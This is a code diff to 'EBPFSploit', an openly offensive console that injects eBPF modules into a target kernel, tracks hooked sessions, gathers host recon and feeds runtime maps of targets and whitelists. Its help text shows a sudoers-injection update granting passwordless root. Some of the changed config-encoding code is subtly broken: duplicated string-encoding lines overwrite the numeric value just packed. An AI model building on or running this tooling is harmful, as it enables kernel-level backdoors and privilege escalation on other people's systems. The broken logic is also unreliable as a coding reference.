@@ -203,8 +203,7 @@ class EBPFSploit:
             os.makedirs(MODULES_DIR)
             print(f"{Fore.YELLOW}[!] modules/ directory does not exist, created.{Fore.WHITE}")
             return
-        print(f"\n{Fore.CYAN}Available Modules{Fore.WHITE}")
-        print("=================")
+        print(f"\n{Fore.CYAN}═══ Available Modules ═══{Fore.WHITE}")
         print(f"{'Name':<20} {'Description'}")
         print(f"{'-'*20} {'-'*45}")
         found = False
@@ -256,7 +255,7 @@ class EBPFSploit:
 
     def _display_recon(self):
         r = self.recon_data
-        print(f"\n{Fore.CYAN}═══  Target Recon  ═══{Fore.WHITE}")
+        print(f"\n{Fore.CYAN}═══ Target Recon ═══{Fore.WHITE}")
         print(f"  Kernel    : {r.get('kernel', '?')}")
         print(f"  Arch      : {r.get('arch', '?')}")
         print(f"  Hostname  : {r.get('hostname', '?')}")
@@ -317,12 +316,13 @@ class EBPFSploit:
         if not meta:
             print(f"{Fore.RED}[-] Unable to read metadata{Fore.WHITE}")
             return
-        print(f"\nModule : {self.current_mod}")
+        print(f"\n{Fore.CYAN}═══ Module Info ═══{Fore.WHITE}")
+        print(f"Name   : {self.current_mod}")
         print(f"Desc   : {meta.get('desc', 'N/A')}\n")
 
         opts = meta.get('options', {})
         if opts:
-            print(f"{Fore.CYAN}Load-time Options (set before run){Fore.WHITE}")
+            print(f"{Fore.CYAN}═══ Load-time Options (set before run) ═══{Fore.WHITE}")
             print(f"{'Option':<18} {'Current':<22} {'Description'}")
             print(f"{'-'*18} {'-'*22} {'-'*30}")
             for key, details in opts.items():
@@ -334,12 +334,12 @@ class EBPFSploit:
         else:
             print(f"{Fore.YELLOW}  [No load-time configuration items for this module, use 'run' directly]{Fore.WHITE}")
 
-        maps_info = meta.get('maps', {})
-        if maps_info:
-            print(f"\n{Fore.CYAN}Runtime-updatable Maps (update after run){Fore.WHITE}")
-            print(f"{'Map Name':<22} {'Key':<10} {'Value':<10} {'Update 示例'}")
+        visible_maps = {k: v for k, v in meta.get('maps', {}).items() if k != 'target_ip_count'}
+        if visible_maps:
+            print(f"\n{Fore.CYAN}═══ Runtime-updatable Maps (update after run) ═══{Fore.WHITE}")
+            print(f"{'Map Name':<22} {'Key':<10} {'Value':<10} {'Update Example'}")
             print(f"{'-'*22} {'-'*10} {'-'*10} {'-'*30}")
-            for mname, minfo in maps_info.items():
+            for mname, minfo in visible_maps.items():
                 kt = minfo.get('key_type', '?')
                 vt = minfo.get('value_type', '?')
                 # Generate update example
@@ -388,11 +388,22 @@ class EBPFSploit:
                     # specifically encode the STRING into config_buf for shadow_walker
                     enc = first_val.encode('utf-8')[:8]
                     config_buf[:8] = enc.ljust(8, b'\x00')
-                elif is_numeric_option and first_val.lstrip('-').isdigit():
-                    config_buf[:4] = struct.pack('<I', int(first_val))
                 else:
+                    opt_type = meta['options'][first_key][0] if len(meta['options'][first_key]) > 0 else "0"
+                    is_numeric_option = str(opt_type).lstrip('-').isdigit()
+
+                    if is_numeric_option and first_val.lstrip('-').isdigit():
+                        config_buf[:4] = struct.pack('<I', int(first_val))
+                    else:
+                        enc = first_val.encode('utf-8')[:63]
+                        config_buf[:len(enc)] = enc
                     enc = first_val.encode('utf-8')[:63]
                     config_buf[:len(enc)] = enc
+                    
+            if 'iface' in meta['options']:
+                iface_val = self.user_configs.get('iface', str(meta['options']['iface'][0]))
+                iface_enc = iface_val.encode('utf-8')[:31]
+                config_buf[64:64+len(iface_enc)] = iface_enc
 
         mod_name_b = self.current_mod.encode('utf-8')
         print(f"{Fore.CYAN}[*] Deploying {self.current_mod} → target kernel...{Fore.WHITE}")
@@ -431,16 +442,16 @@ class EBPFSploit:
             print(f"{Fore.GREEN}[+] Session {sid} opened  "
                   f"({progs} programs hooked){Fore.WHITE}")
                   
-            # If there were multiple initial targets, push the rest now seamlessly!
+            # If there were multiple initial targets/whitelists, push the rest now seamlessly!
             if meta and 'options' in meta:
-                first_key = next(iter(meta['options']), None)
-                if first_key and first_key == 'target':
-                    default_val_str = str(meta['options'][first_key][0])
-                    raw_val = self.user_configs.get(first_key, default_val_str)
-                    val_parts = raw_val.replace(',', ' ').split()
-                    if len(val_parts) > 1:
-                        # Silently update all of them since cmd_update issues CMD_CLEAR
-                        self.cmd_update([str(sid), "target"] + val_parts)
+                for opt_key in meta['options']:
+                    if opt_key.startswith('target'):
+                        default_val_str = str(meta['options'][opt_key][0])
+                        raw_val = self.user_configs.get(opt_key, default_val_str)
+                        if raw_val:
+                            val_parts = raw_val.replace(',', ' ').split()
+                            # We update explicitly even if it's 1 value, to override agent.c generic initialization
+                            self.cmd_update([str(sid), opt_key] + val_parts)
         else:
             print(f"{Fore.RED}[-] Load failed: {resp.get('error','unknown')}{Fore.WHITE}")
 
@@ -479,8 +490,7 @@ class EBPFSploit:
             print(f"{Fore.YELLOW}  [No active sessions]{Fore.WHITE}")
             return
 
-        print(f"\n{Fore.CYAN}Active Sessions{Fore.WHITE}")
-        print("================")
+        print(f"\n{Fore.CYAN}═══ Active Sessions ═══{Fore.WHITE}")
         print(f"{'ID':<6} {'Module':<20} {'Programs'}")
         print(f"{'-'*6} {'-'*20} {'-'*10}")
         for sid, s in self.active_sessions.items():
@@ -668,7 +678,7 @@ class EBPFSploit:
             print(f"Current Config  : {Fore.YELLOW}No runtime parameters set.{Fore.WHITE}\n")
             return
 
-        print(f"\n{Fore.CYAN}Current Parameters (Local Record):{Fore.WHITE}")
+        print(f"\n{Fore.CYAN}═══ Current Parameters (Local Record) ═══{Fore.WHITE}")
         for mname, entries in map_state.items():
             print(f"  {Fore.GREEN}[Map: {mname}]{Fore.WHITE}")
             for k, v in entries.items():
@@ -677,7 +687,13 @@ class EBPFSploit:
                     disp_v = repr(v)[1:-1]
                     print(f"    Key {k:<6} => \"{disp_v}\"")
                 else:
-                    print(f"    Key {k:<6} => {v}")
+                    disp_k = k
+                    if mname in ('target_ip', 'whitelist'):
+                        try:
+                            disp_k = socket.inet_ntoa(struct.pack("<I", int(k)))
+                        except Exception:
+                            pass
+                    print(f"    Key {disp_k:<6} => {v}")
         print()
 
     # -- Main interactive shell -----------------------------------------------
@@ -764,8 +780,7 @@ class EBPFSploit:
 
                 if act == "help":
                     print(f"""
-{Fore.CYAN}Core Commands{Fore.WHITE}
-=============
+{Fore.CYAN}═══ Core Commands ═══{Fore.WHITE}
   help                          Show this help
   list                          List all available modules in modules/ directory
   use <module>                  Select module
@@ -773,8 +788,7 @@ class EBPFSploit:
   set <KEY> <val>               Set configuration parameters before loading
   run                           Inject current module into target kernel
 
-{Fore.CYAN}Session Commands{Fore.WHITE}
-================
+{Fore.CYAN}═══ Session Commands ═══{Fore.WHITE}
   sessions                      View all currently running module sessions
   show session <id>             View current parameter configuration of a session (local record)
   unload <session_id>           Hot-unload module of specified session (removes all Hooks)
@@ -791,8 +805,7 @@ class EBPFSploit:
       update 2 inject_payload "\\nuser ALL=(ALL:ALL) NOPASSWD:ALL\\n"
                                           Modify sudoers injection rule
 
-{Fore.CYAN}Recon Commands{Fore.WHITE}
-================
+{Fore.CYAN}═══ Recon Commands ═══{Fore.WHITE}
   recon                         Refresh and display Agent environment reconnaissance info
 
   exit                          Exit console
